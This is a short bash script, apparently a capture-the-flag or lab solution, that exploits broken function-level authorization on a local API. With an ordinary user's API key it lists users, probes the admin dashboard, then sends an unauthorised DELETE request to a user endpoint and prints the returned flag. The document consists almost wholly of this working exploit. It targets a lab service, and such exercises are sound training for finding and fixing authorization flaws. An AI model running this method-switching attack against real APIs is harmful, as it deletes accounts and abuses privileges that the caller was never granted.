#!/bin/bash
echo "=== Broken Function-Level Authorization Exploitation ==="
echo ""

API_KEY="user_key_12345"
BASE_URL="http://localhost:4003"

echo "[*] Step 1: List users..."
curl -s -H "API-Key: $API_KEY" "$BASE_URL/api/users" | jq .
echo ""

echo "[*] Step 2: Try accessing protected admin dashboard (should fail)..."
curl -s -H "API-Key: $API_KEY" "$BASE_URL/api/admin/dashboard" | jq .
echo ""

echo "[*] Step 3: EXPLOIT - Try DELETE method on user endpoint..."
echo "DELETE $BASE_URL/api/users/target"
RESPONSE=$(curl -s -X DELETE -H "API-Key: $API_KEY" "$BASE_URL/api/users/target")
echo "$RESPONSE" | jq .
echo ""

FLAG=$(echo "$RESPONSE" | jq -r '.flag')
echo "ðŸš© FLAG FOUND: $FLAG"
